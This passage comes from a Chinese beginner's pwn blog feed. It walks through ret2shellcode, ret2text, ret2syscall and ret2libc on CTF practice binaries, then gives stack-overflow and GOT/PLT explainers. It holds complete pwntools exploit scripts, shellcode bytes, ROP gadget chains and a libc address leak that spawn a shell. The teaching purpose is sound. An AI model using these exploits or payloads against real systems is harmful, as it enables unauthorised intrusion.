确定利用前提 此时只需要确定是否开启NX和bss段是否可以执行首先检查保护机制 然后在IDA中确定buf2的BSS段位置 12.bss:0804A080 public buf2.bss:0804A080 ; char buf2[100] 查看该BSS段是否具有执行权限 一切完成后，可以发现这个文件可以进行ret2shellcode 调试 在get处设置断点，来确定s变量与ebp的距离，可以看到 s 的地址为 0xffffbe3c，计算一下得出 s 相对于 ebp 的偏移为 0x6c。 12345这里为什么要在get处设置断点？因为知道s的地址才能计算出相对于ebp的偏移，此处esp刚好存储s的的地址0x804858c &lt;main+95&gt;: lea eax,[esp+0x1c]0x8048590 &lt;main+99&gt;: mov DWORD PTR [esp],eax当然您可以选择其它位置，只不过这里更便捷。 可以知道溢出的临界点与触发地址还有一个4个字节的间隔所以payload的结构是含有shellcode的6c个字节+4个字节+buf2地址 123456from pwn import *sh = process(&apos;./ret2shellcode&apos;)shellcode = asm(shellcraft.sh())buf2_addr = 0x804a080sh.sendline(shellcode.ljust(112, &apos;A&apos;) + p32(buf2_addr)) //含有shellcode的6c个字节+4个字节+buf2地址sh.interactive() 扩展点123456789&gt;&gt;&gt; asm(shellcraft.sh())&apos;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&apos;&gt;&gt;&gt; asm(shellcraft.sh()).ljust(112, &apos;A&apos;)&apos;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&apos;所以我们也可以直接构造，pwntools提供了shellcraft模块更方便。shellcraft模块是shellcode的模块，包含一些生成shellcode的函数。这里的shellcraft.sh()则是执行/bin/sh的shellcodeshellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;shellcode.ljust(112, &apos;A&apos;) + p32(buf2_addr) ret2text含义 顾名思义，ret to text，也就是说我们的利用点在原文件中寻找即可，控制程序执行程序本身已有的的代码 (.text)。 从例子中解析ret2text 来看一个例子：ret2text 发现利用点 IDA查看找到构成栈溢出漏洞的条件 确定利用前提 开启了NX，栈上无法写入shellcode 那么我们寻找程序中是否存在/bin/sh或者systerm()等在IDA的Strings窗口找到/bin/sh 123456789101112131415161718192021LOAD:08048154 00000013 C /lib/ld-linux.so.2LOAD:080482C9 0000000A C libc.so.6LOAD:080482D3 0000000F C _IO_stdin_usedLOAD:080482E2 00000005 C getsLOAD:080482E7 00000006 C srandLOAD:080482ED 0000000F C __isoc99_scanfLOAD:080482FC 00000005 C putsLOAD:08048301 00000005 C timeLOAD:08048306 00000006 C stdinLOAD:0804830C 00000007 C printfLOAD:08048313 00000007 C stdoutLOAD:0804831A 00000007 C systemLOAD:08048321 00000008 C setvbufLOAD:08048329 00000012 C __libc_start_mainLOAD:0804833B 0000000F C __gmon_start__LOAD:0804834A 0000000A C GLIBC_2.7LOAD:08048354 0000000A C GLIBC_2.0.rodata:08048763 00000008 C /bin/sh.rodata:0804876C 00000037 C There is something amazing here, do you know anything?.rodata:080487A4 00000022 C Maybe I will tell you next time !.eh_frame:08048833 00000005 C ;*2$\&quot; 双击找到地址，那就是我们溢出到EIP的地址 调试 因为原理相似，不再赘述，详细见ret2shellcode ret2syscall含义 顾名思义，ret to syscall，就是调用系统函数达到目的 从例子中解析ret2syscall的方法 那么这里我们来深入了解一下什么是ret2syscall？为什么可以ret2syscall？在深入了解之前，先从一个例子rop中快速过一下方法IDA中查看伪代码 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;); puts(&quot;What do you plan to do?&quot;); gets(&amp;v4); return 0;&#125; 与上面两个例子相似，原理详细见ret2shellcode，但是获取/bin/sh则需要使用系统调用来获取，也就是ret2syscall专属方法，下面我们就说一下这个专属方法。首先什么是系统调用？ 1在计算中，系统调用是一种编程方式，计算机程序从该程序中向执行其的操作系统内核请求服务。这可能包括与硬件相关的服务（例如，访问硬盘驱动器），创建和执行新进程以及与诸如进程调度之类的集成内核服务进行通信。系统调用提供了进程与操作系统之间的基本接口。 至于系统调用在其中充当什么角色，稍后再看现在我们要做的是：让程序调用execve(“/bin/sh”,NULL,NULL)函数即可拿到shell调用此函数的具体的步骤是这样的：因为该程序是 32 位，所以我们需要使得系统调用号，即 eax 应该为 0xb第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。第二个参数，即 ecx 应该为 0第三个参数，即 edx 应该为 0最后再执行int 0x80触发中断即可执行execve()获取shell 我们来看这一套流程：1、存在栈溢出2、使用ret2syscall手法进行操作第一步与前两个方法一样，怎么样去偏移怎么去覆盖不再赘述，详见ret2shellcode，第二步ret2syscall手法也是中规中矩，照猫画虎即可。 细说系统调用在ret2syscall的作用 我们这里要说一说系统调用在其中充当了什么角色，这样才能更好地理解为什么要ret2syscall。 一探系统调用从用户态到内核态 先对这三个词的概念进行了解一下 1234用户态：user_space（或用户空间）是指在操作系统内核之外运行的所有代码。user_space通常是指操作系统用于与内核交互的各种程序和库：执行输入/输出，操纵文件系统对象的软件，应用程序软件等。也就是上层应用程序的活动空间，应用程序的执行必须依托于内核提供的资源内核态：控制计算机的硬件资源，并提供上层应用程序运行的环境，cpu可以访问内存的所有数据，包括外围设备，例如硬盘，网卡，cpu也可以将自己从一个程序切换到另一个程序。两中空间的分离可提供内存保护和硬件保护，以防止恶意或错误的软件行为。系统调用：为了使上层应用能够访问到这些资源，内核为上层应用提供访问的接口。 大致的关系如下： 再看一下系统调用的基本过程：开始时应用程序准备参数，发出调用请求，然后glibc中也就是c标准库封装函数引导，执行系统调用，这里我们只探讨到这两个过程。可以发现上述两个过程从用户态（第一步）过渡到内核态（第二步），系统调用就是中间的过渡件，我们能控制的地方就是用户态，然后通过系统调用控制到内核态。先看一个程序 1234567891011121314section .text global _start _start: mov edx, len ;message length mov ecx, msg ;message to write mov ebx, 1 ;file descriptor (stdout) mov eax, 4 ;system call number (sys_write) int 0x80 ;call kernel mov eax, 1 ;system call number (sys_exit) int 0x80 ;call kernelsection .datamsg db &apos;Hello World&apos;,0xalen equ $ - msg 可以发现该程序通过调用sys_write函数进行输出Hello World，那么sys_write()是什么？ 1sys_write(unsigned int fd, const char __user *buf, size_t count); 可以发现前三个mov指令是把该函数需要的参数放进相应寄存器中，然后把sys_write的系统调用号放在EAX寄存器中，然后执行int 0x80触发中断即可执行sys_call()，那么问题就来了：这几个寄存器有什么作用？为什么int 0x80？int 0x80后发生了什么？带着问题我们继续往下看 二探系统调用set_system_gate 为何int 0x80？在系统文件中有这么一行代码 1set_system_gate(0x80,&amp;system_call); 在系统启动的时候，系统会在sched_init(void)函数中调用set_system_gate(0x80,&amp;system_call)，设置中断向量号0x80的中断描述符，也就是说实现了系统调用 (处理过程system_call)和 int 0x80中断的对应，进而通过此中断号用EAX实现不同子系统的调用。详细了解，参见《linux 0.12》int 0x80后发生了什么？经过初始化以后，每当执行 int 0x80 指令时，产生一个异常使系统陷入内核空间并执行128号异常处理程序，也就是绑定后的函数，即系统调用处理程序 system_call()，此时CPU完成从用户态到内核态切换，开始执行system_call()。 system_call() 当进入system_call()后，主要做了两件事(我们关心的事情，其它的事情忽略，有兴趣可以去了解)首先处理中断前设置环境的过程然后找到实际处理在入口规定：数值会放在eax,ebx,ecx,edx，参数一般为4个所以ebx,ecx,edx会被压入栈中设置环境(也就是函数所需要的参数)，当然ds、es等也要压入，这里不是我们考虑的范围内，有兴趣可以去了解。然后就会调用call_sys_call_table(,%eax,4)来实现相应系统函数的调用。那么从大门进入后怎么知道进那个小门(系统函数)呢？存在这么一个数组——sys_call_table(对应的处理函数少部分在这里面进行处理)，处理函数功能号对应sys_call_table[]的下标，sys_execve()函数的下标就是11，也就是0xb。此刻应该会明朗了，那么我们言归正传，回到ret2syscall来。 从例子中再次解析ret2syscall创造条件 通过以上的了解，我们知道如果要执行execve(“/bin/sh”,NULL,NULL)函数我们需要这样做： 1234567; NASMint execve(const char *filename, char *const argv[], char *const envp[]); mov eax, 0xb ; execve系统调用号为11mov ebx, filename mov ecx, argvmov edx, envpint 0x80 ; 触发系统调用 其中，execve()执行程序由 filename决定。filename必须是一个二进制的可执行文件，或者是一个脚本以#！格式开头的解释器参数参数。记得当时考(ku)研(bi)观看张宇老师视频时的一句话：大手一挥，毛主席说,没有条件要创造条件。那么我们也要小手一挥，没有条件创造条件。上面也提到了，我们只能控制用户态的操作，也就是上面程序类似mov指令的操作。那么怎么做呢？这里需要ret2syscall的特有操作之前已经知道各个寄存器的需要的内容了，此时就要想办法把这些值存储进对应的寄存器中回归词意，ret to syscall，也就是找ret结尾的片段，比如把EAX置为0xb，执行以下程序即可完成。 12pop eaxret 当然父程序通过栈溢出，执行ret后栈顶值为0xb，这样再调用此片段(父程序的ret addr为此片段的首地址)，EAX寄存器就会置为0xb，后面详细解读过程。如果有多个片段连接起来不就可以把四个寄存器置为相应的值了吗 只要用户态栈空间能够控制成这样(只是举例其中的一种排列方式)就可以达到ret2syscall的目的简单分析一下流程：1、成功溢出2、通过ret指令使得EIP指向pop eax;的地址3、执行pop eax;栈顶值0xb成功出栈，栈顶指针下移4、通过ret指令使得EIP指向pop ebx;的地址…..一切都清楚后，下面就开始进行创造条件 123456pwn@pwn-PC:~/Desktop$ ROPgadget --binary rop --only &apos;pop|ret&apos; | grep &apos;eax&apos;0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x080bb196 : pop eax ; ret0x0807217a : pop eax ; ret 0x80e0x0804f704 : pop eax ; ret 30x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 选取其中一个就可以，比如可以选择第一行，那么你的用户态栈内容按照第一个的指令进行变化，出栈四次，然后才可以将ESP值置为下一个条件(pop ebx;)的地址，也就是说0xb+‘AAAA’+’AAAA’+’AAAA’+addr(pop ebx;)，因此我们不如选择第二行。 12345678pwn@pwn-PC:~/Desktop$ ROPgadget --binary rop --only &apos;pop|ret&apos; | grep &apos;ebx&apos;0x08049a94 : pop ebx ; pop esi ; ret0x080481c9 : pop ebx ; ret0x080d7d3c : pop ebx ; ret 0x6f90x08099c87 : pop ebx ; ret 80x0806eb91 : pop ecx ; pop ebx ; ret0x0806336b : pop edi ; pop esi ; pop ebx ; ret0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 简单展示部分内容，与上一个选取原理是一样的，为了方便，我们选择最后一行。 12345678910pwn@pwn-PC:~/Desktop$ ROPgadget --binary rop --string &apos;/bin/sh&apos;Strings information============================================================0x080be408 : /bin/shpwn@pwn-PC:~/Desktop$ ROPgadget --binary rop --only &apos;int&apos;Gadgets information============================================================0x08049421 : int 0x80Unique gadgets found: 1 条件已经创造完了，万事俱备，只欠东风，现在只需要把这些条件串联起来就可以实现ret2syscall，我们从下图来能够看到，ESP指针依次下移，直到指向int 0x80触发中断。 payload123456789from pwn import *sh = process(&apos;./rop&apos;)pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = flat([&apos;A&apos; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() ret2libc 对于ret2libc，借用ctfwiki的三个例子详细解读其中的原理和利用过程。 含义 我们知道，操作系统通常使用动态链接的方法来提高程序运行的效率。那么在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载。也就是控制执行 libc（对应版本） 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)（或者execve(“/bin/sh”,NULL,NULL)），故而此时我们需要知道 system 函数的地址，具体可以移步深入理解GOT表和PLT表。 初探ret2libc 上面已经提到了，我们只要可以执行类似system(“/bin/sh”)的函数即可获取shell，在存在溢出的程序中我们在一般怎么去执行此函数呢？大致可以分为三类：一、”/bin/sh”字符串和system函数都可以在程序找到二、二者其一找不到（一般为”/bin/sh”字符串找不到）三、二者都没有无论是哪一种情况，我们需要找到”/bin/sh”字符串和system()函数，并且堆栈位置如下： 当然还需了解一下x86对于形参的处理，就可以知道上图的“任意四字符”处为返回地址，因为我们不用考虑程序后续怎去正常运行，达到getshell的目的即可，程序的具体执行过程可以参照走进栈溢出。 那么我们分开说一下怎去利用。 再探ret2libc 先看一个简单的例子， 也就是我们说的第一种情况。检查保护机制，程序为32位并且开了NX保护，继续反编译从伪代码可以发现gets()处导致栈溢出，对于以上步骤，本文已经详细讲述过，不再赘述，以下两种情况的分析也直接省去该过程。按照上述的理论，我们在IDA的Stings中可以找到”/bin/sh”，在Functions中可以找到system()函数 123456.rodata:08048720 aBinSh db &apos;/bin/sh&apos;,0 ; DATA XREF: .data:shell↓o.plt:08048460 ; int system(const char *command).plt:08048460 _system proc near ; CODE XREF: secure+44↓p.plt:08048460 command = dword ptr 4.plt:08048460 jmp ds:off_804A018.plt:08048460 _system endp 找到0x08048720和0x08048460后，按照上图所示的堆栈位置构造payload： 123binsh_addr = 0x8048720system_plt = 0x8048460payload = flat([&apos;a&apos; * 112, system_plt, &apos;b&apos; * 4, binsh_addr]) 三探ret2libc 在这一节，首先说一下第二种情况的例子。可以发现在IDA中只能找到system()函数的plt地址，却没有看到”/bin/sh”字符串的踪影 12345.plt:08048490 ; int system(const char *command).plt:08048490 _system proc near ; CODE XREF: secure+44↓p.plt:08048490 command = dword ptr 4.plt:08048490 jmp ds:off_804A01C.plt:08048490 _system endp 没有了”/bin/sh”字符串，就没办法获取shell，那么我们就得创造条件。除了现成的内容，我们也可以人工输入，那么就需要gets()函数来实现这一目的，因此目前的结构应该如下图所示。 当然也可以进行堆栈平衡，在执行完gets()函数后提升堆栈(add esp, 4)，堆栈位置如下： 1程序在读写数据的时候是通过地址查找的,如果函数调用之前的堆栈与函数调用之后的堆栈不一致,就可能导致找不到数据或找到的数据错误,那么久有可能导致程序崩溃。 这样构造使得我们的堆栈逻辑更好看，一个函数一个函数的顺序执行，从压入形参到结束，显得有条理，但是只要达到目的即可，第一种或许更方便一些。那么采取第一种做法，找到相应的地址 1234.plt:08048460 _gets proc near ; CODE XREF: main+72↓p.plt:08048460 s = dword ptr 4.plt:08048460 jmp ds:off_804A010.plt:08048460 _gets endp 如同ret2shellcode一节中做法一样，在bss段找到一个数组，确保其有执行权限 1.bss:0804A080 ; char buf2[100] 完成这些步骤后，就可以构造payload了 123456gets_plt = 0x08048460system_plt = 0x08048490buf2 = 0x804a080payload = flat([&apos;a&apos; * 112, gets_plt, system_plt, buf2, buf2])sh.sendline(payload)sh.sendline(&apos;/bin/sh&apos;) 继续来看第三种情况，如果什么都没有，我们怎么去一个一个去创造条件？对于’/bin/sh’字符串的构造已经知道了，剩下的就是怎么找到system函数这里需要事先了解下动态链接时GOT表和PLT表的作用，可以参考深入理解GOT表和PLT表 此文。可以发现，GOT表的第三项调用_dl_runtimw_resolve将真正的函数地址，也就是glibc运行库中的函数的地址，回写到代码段，就是got[n]（n&gt;=3）中。也就是说在函数第一次调用的时，才通过连接器动态解析并加载到.got.plt中，而这个过程称之为延时加载或者惰性加载。目前的思路就是，通过栈溢出泄露某函数(一般为泄露 __libc_start_main 地址，这里选择泄露put函数)的GOT表地址，然后根据偏移量（libc中函数与函数之间的距离时固定的）来计算出system()的地址，有了’/bin/sh’也有了system，shell自然就有了，如下图所示。 使用pwntools编写 1234567891011from pwn import *sh = process(&apos;./ret2libc3&apos;)elf = ELF(&apos;./ret2libc3&apos;)puts_plt = elf.plt[&apos;puts&apos;]puts_got = elf.got[&apos;puts&apos;]payload = flat([&quot;A&quot; * 112, puts_plt, &quot;A&quot; * 4, puts_got])sh.sendlineafter(&quot;Can you find it !?&quot;, payload)puts_addr = u32(sh.recv(4))print &quot;[*]puts addr: &quot; + hex(puts_addr) 可以发现通过相应的模块可以顺利获取puts函数的真实地址（也就是GOT表中存储的地址） 12345678910111213141516pwn@pwn-PC:~/Desktop$ python ret2libc.py [+] Starting local process &apos;./ret2libc3&apos;: pid 45169[*] &apos;/home/pwn/Desktop/ret2libc3&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[*] u&apos;/usr/lib/i386-linux-gnu/libc-2.24.so&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[*]puts addr: 0xf7d6f880[*] Stopped process &apos;./ret2libc3&apos; (pid 45169) 那么问题来了？此处的溢出用来获取put函数的真实地址，怎么再去进行执行system(‘bin/sh’)呢？如果存在两个溢出点就完美了，可惜只有一个。不过刚才提到的返回地址，在这里就有了用武之地了，它可以让我们有“两个”溢出点。如果put函数的返回地址可以回到函数的入口，不就可以再执行一遍gets(溢出点)了吗？怎么构造之前简单了解用户代码的入口和系统代码的入口，在一个程序运行中有两个入口，一个是main()，另一个是_start()，简单来说，main()函数是用户代码的入口，是对用户而言的；而_start()函数是系统代码的入口，是程序真正的入口。这里以main()函数作为入口为例，如下图所示： 一目了然后，构造poc即可。先来梳理一下我们需要知道什么条件：一、puts函数的地址和真实地址二、main函数的真实地址三、system函数的真实地址四、’/bin/sh’字符串的位置条件一我们已经具备了，那么怎么搞定剩下的条件，以及堆栈位置。怎么获取main、system和’/bin/sh’的真实地址呢？当然与获取put的真实地址一样 1234567main_addr = elf.symbols[&apos;main&apos;]程序运行起来后main_addr就是真实地址了之后相减获取基址libc.address = puts_addr - libc.symbols[&apos;puts&apos;]然后获取system和&apos;/bin/sh&apos;的地址system_addr = libc.symbols[&apos;system&apos;]binsh_addr = next(libc.search(&apos;/bin/sh&apos;)) 那么直接构造exp 12345678910111213141516171819from pwn import *sh = process(&apos;./ret2libc3&apos;)elf = ELF(&apos;./ret2libc3&apos;)libc = elf.libcputs_plt = elf.plt[&apos;puts&apos;]puts_got = elf.got[&apos;puts&apos;]main_addr = elf.symbols[&apos;main&apos;]payload = flat([&quot;A&quot; * 112, puts_plt, main_addr, puts_got])sh.sendlineafter(&quot;Can you find it !?&quot;, payload)puts_addr = u32(sh.recv(4))libc.address = puts_addr - libc.symbols[&apos;puts&apos;]system_addr = libc.symbols[&apos;system&apos;]binsh_addr = next(libc.search(&apos;/bin/sh&apos;))payload2 = flat([&quot;B&quot; * 104, system_addr, &quot;B&quot; * 4, binsh_addr])sh.sendline(payload2)sh.interactive() 泄露__libc_start_main地址，使用_start也是一样的，懂得原理稍微改一下就可以，在ctfwiki 中引用了LibcSearcher 1libc = LibcSearcher(&apos;__libc_start_main&apos;, libc_start_main_addr) 另外也可以根据第二种情况的思路，引入gets和buf来获取字符串’/bin/sh’，如下图所示 exp如下 12345678910111213141516171819202122from pwn import *sh = process(&apos;./ret2libc3&apos;)elf = ELF(&apos;./ret2libc3&apos;)libc = elf.libcputs_plt = elf.plt[&apos;puts&apos;]puts_got = elf.got[&apos;puts&apos;]main_addr = elf.symbols[&apos;main&apos;]payload = flat([&quot;A&quot; * 112, puts_plt, main_addr, puts_got])sh.sendlineafter(&quot;Can you find it !?&quot;, payload)puts_addr = u32(sh.recv(4))gets_plt = 0x08048440buf2 = 0x804a080libc.address = puts_addr - libc.symbols[&apos;puts&apos;]system_addr = libc.symbols[&apos;system&apos;]payload2 = flat([&apos;a&apos; * 104, gets_plt, system_addr, buf2, buf2])sh.sendline(payload2)sh.sendline(&apos;/bin/sh&apos;)sh.interactive() 0x05 尾记 还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。参考：http://drops.xmd5.com/static/drops/tips-6597.html (蒸米大佬的文章，极力推荐)https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zhhttp://www.cnblogs.com/elvirangel/p/7484772.html]]></content>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[走进栈溢出]]></title>
    <url>%2F2020%2F03%2F04%2F1%2F</url>
    <content type="text"><![CDATA[最近事情较多，又是停了好久才更，无奈，我渴望知识的心灵遭受到了创伤 0x01 前言 和我一样，有一些计算机专业的同学可能一直都在不停地码代码，却很少关注程序是怎么执行的，也不会考虑到自己写的代码是否会存在栈溢出漏洞，借此机会我们一起走进栈溢出。 0x02 程序是怎么运行的 在了解栈溢出之前我们先了解一下程序执行过程程序的执行过程可看作连续的函数调用。当一个函数执行完毕时，程序要回到call指令的下一条指令继续执行，函数调用过程通常使用堆栈实现。123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; test1(1); test2(2); test3(3); return 0;&#125;int test1(int test1)&#123;int a = 6; printf(&quot;1&quot;); return 1;&#125;int test2(int test2)&#123; printf(&quot;2&quot;); return 2;&#125;int test3(int test3)&#123; printf(&quot;3&quot;); return 3;&#125; 将以上代码编译成32位可执行文件，放在ollydbg中就行调试，来详细看一下执行过程因为程序的执行可以看做一个一个函数的执行(main函数也一样)，因此我们挑选其中一个即可，在test1()函数设置断点F7单步调试第一步mov dword ptr ss:[esp],0x1，进行传参，简洁明了。第二步call mian.00401559，进入test()，这里我们关注一下esp和栈顶值，将该指令的下一条指令的地址进行压栈，既然有压栈那么就会有出栈，这就与函数中的retn指令形成呼应。第三步push ebp，就是把ebp的值进行压栈，那么这个ebp是什么呢？有什么用呢？EBP叫做扩展基址指针寄存器(extended base pointer) ，里面放一个指针，该指针指向系统栈最上面一个栈帧的底部，用于C运行库访问栈中的局部变量和参数。那么这一步的意义就是：保存旧栈帧中的帧基指针以便函数返回时恢复旧栈帧第四步，mov ebp，esp，将esp的值放在ebp中，我们再来了解一下什么是esp？ESP（Extended Stack Pointer）为扩展栈指针寄存器，是指针寄存器的一种，用于存放函数栈顶指针，指向栈的栈顶（下一个压入栈的活动记录的顶部），也就是它不停在变，刚才提到的ebp指向栈底，在函数内部执行过程中是不变。那么我们再看一下这一步的作用：从第三步可以知道esp存储的值是旧栈帧中的帧基指针，而esp值栈顶指针，随时都在变，因此为了函数结束后能恢复，把esp值（外层函数栈底地址）保存在本函数栈底ebp中。简而言之，将内部函数ebp的值作为地址，它存放外函数的ebp的值。这一步在末尾也存在逆向指令leave。第五步是sub esp,0x28，开辟该函数的局部变量空间紧接着第六步mov dword ptr ss:[ebp-0xC],0x6，给变量a一个大小是0xC的空间，并且赋值。然后就是传参字符1的ascii码，调用printf函数，把返回值放到eax。我们重点来看leave指令，可以发现ebp的值恢复了，esp的值也变了，相当于mov esp,ebp;pop ebp最后执行retn指令，至此一个函数执行完毕，esp和eip的值都被改变，相当于pop eip，然后程序继续执行。EIP是指令寄存器，存放当前指令的下一条指令的地址。CPU该执行哪条指令就是通过EIP来指示的 0x03 栈溢出 分析完这一过程，相信大家对函数是怎么执行的应该明朗了，那么我们言归正传，继续聊一下栈溢出。首先我们先看一下什么是栈？栈可以看作是一个漏斗，栈底地址大，栈顶地址小，然后在一个存储单元中，按照由小到大进行存储，它的目的是赋予程序一个方便的途径来访问特定函数的局部数据，并从函数调用者那边传递信息。栈溢出属于缓冲区溢出，指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。另外，我们也不难发现，发生栈溢出的基本前提是：程序必须向栈上写入数据、写入的数据大小没有被良好地控制。引用一个例子来了解一下栈溢出12345678910111213#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;void vulnerable() &#123; char s[12]; gets(s); puts(s); return;&#125;int main(int argc, char **argv) &#123; vulnerable(); return 0;&#125; 很显然符合以上两个条件，gets()成为突破口我们在主函数处下断点，运行和调试lea eax，dword ptr ss:[ebp-0x14] 这时开辟一个空间给变量，也即是s，如图所示我们想执行sucess()函数，要怎么办呢？执行完vulnerable()函数后，会还原ebp，改变esp的值(leave)，然后retn，也就是pop eip，然后CPU根据eip指针指向的指令继续运行。我们能抓到的点就是控制eip，怎么控制？通过控制栈顶的值，那么栈顶的值是什么？栈顶的值是进入该函数时储存的下一条指令的地址。这里提一点，进入函数，要保存两个值：下一条命令的地址、EBP旧栈帧的帧基指针，只有这样才能完全恢复。此时我们可以构造payload，来控制我们要控制的地方，栈中存储EBP值的存储单元的上一个存储单元，也就是图中的存储address的存储单元我们先试验一下输入0x14 *‘A’+BBBB+0000，发生的变化很好，按照我们的预想进行(python -c ‘print “A”* 0x18+p32(0x00401520)’) 就可以达到栈溢出的效果 0x04 尾记 还没有入门，只是个人的见解，如有错误，希望各位大佬指出。参考：https://en.wikipedia.org/wiki/Stack_buffer_overflowhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/]]></content>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解GOT表和PLT表]]></title>
    <url>%2F2020%2F02%2F08%2F1%2F</url>
    <content type="text"><![CDATA[一起感受二进制魅力所在 0x01 前言 操作系统通常使用动态链接的方法来提高程序运行的效率。在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，如果有函数并没有被调用，那么它就不会在程序生命中被加载进来。这样的设计就能提高程序运行的流畅度，也减少了内存空间。而且现代操作系统不允许修改代码段，只能修改数据段，那么GOT表与PLT表就应运而生。 0x02 初探GOT表和PLT表 我们先简单看一个例子我们跟进一下scanf@plt会发现，有三行代码123jmp 一个地址push 一个值到栈里面jmp 一个地址 看函数的名字就可以知道这是scanf函数的plt表，先不着急去了解plt是做什么用的，我们继续往下看我们先看一下第一个jmp是什么跳到哪里其实这是plt表对应函数的got表，而且我们会发现0x201020的值是压栈命令的地址，其他地方为0，此时就想问：一、got表与plt表有什么意义，为什么要跳来跳去？二、got表与plt表有什么联系，有木有什么对应关系？那么带着疑问先看答案，再去印证我们要明白操作系统通常使用动态链接的方法来提高程序运行的效率，而且不能回写到代码段上。在上面例子中我们可以看到，call scanf —&gt; scanf的plt表 —&gt;scanf的got表，至于got表的值暂时先不管，我们此刻可以形成这样一个思维，它能从got表中找到真实的scanf函数供程序加载运行。我们这么认为后，那么这就变成了一个间接寻址的过程我们就把获取数据段存放函数地址的那一小段代码称为PLT（Procedure Linkage Table）过程链接表存放函数地址的数据段称为GOT（Global Offset Table）全局偏移表。我们形成这么一个思维后，再去仔细理解里面的细节 0x03 再探GOT表和PLT表 已经明白了这么一个大致过程后，我们来看一下这其中是怎么一步一步调用的上面有几个疑点需要去解决：一、got表怎么知道scanf函数的真实地址？二、got表与plt表的结构是什么？我们先来看plt表刚才发现scanf@plt表低三行代码是 jmp 一个地址 ，跟进看一下是什么其实这是一个程序PLT表的开始（plt[0]），它做的事情是：12push got[1]jmp **got[2] 后面是每个函数的plt表。此时我们再看一下这个神秘的GOT表除了这两个（printf和scanf函数的push 0xn的地址，也就是对应的plt表的第二条代码的地址），其它的got[1]， got[2] 为0，那么plt表指向为0的got表干什么呢？因为我们落下了一个条件，现代操作系统不允许修改代码段，只能修改数据段，也就是回写，更专业的称谓应该是运行时重定位。我们把程序运行起来，我们之前的地址和保存的内容就变了在这之前，我们先把链接时的内容保存一下，做一个对比12345② 寻找printf的plt表③ jmp到plt[0]④ jmp got[2] -&gt; 0x00000⑤⑥ printf和scanf的got[3] got[4] -&gt; plt[1] plt[2]的第二条代码的地址⑦⑧ 证实上面一点 运行程序，在scanf处下断点可以发现，此时scanf@plt表变了，查看got[4]里内容依然是push 0x1所在地址继续调试，直到这里，got[4]地址被修改此时想问了，这是哪里？然后就是got[2]中call&lt;_dl_fixup&gt;从而修改got[3]中的地址那么问题就来了，刚才got[2]处不是0吗，怎么现在又是这个(_dl_runtime_resolve)？这就是运行时重定位。其实got表的前三项是：123got[0]：address of .dynamic section 也就是本ELF动态段(.dynamic段）的装载地址got[1]：address of link_map object( 编译时填充0）也就是本ELF的link_map数据结构描述符地址，作用：link_map结构，结合.rel.plt段的偏移量，才能真正找到该elf的.rel.plt表项。got[2]：address of _dl_runtime_resolve function (编译时填充为0) 也就是_dl_runtime_resolve函数的地址，来得到真正的函数地址，回写到对应的got表位置中。 那么此刻，got表怎么知道scanf函数的真实地址？这个问题已经解决了。我们可以看一下其中的装载过程：说到这个，可以看到在_dl_runtimw_resolve之前和之后，会将真正的函数地址，也就是glibc运行库中的函数的地址，回写到代码段，就是got[n]（n&gt;=3）中。也就是说在函数第一次调用的时，才通过连接器动态解析并加载到.got.plt中，而这个过程称之为延时加载或者惰性加载。到这里，也要接近尾声了，当第二次调用同一个函数的时候，就不会与第一次一样那么麻烦了，因为got[n]中已经有了真实地址，直接jmp该地址即可。 0x04 尾记 当时学习时看到大佬精心制作的一张动图，在此借用一下，特别感谢。 想学习二进制的pwn弟弟还需要努力，希望我的小白学习经验记录下来可以帮助更多和我一样的小白。]]></content>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解File descriptor]]></title>
    <url>%2F2020%2F02%2F07%2F1%2F</url>
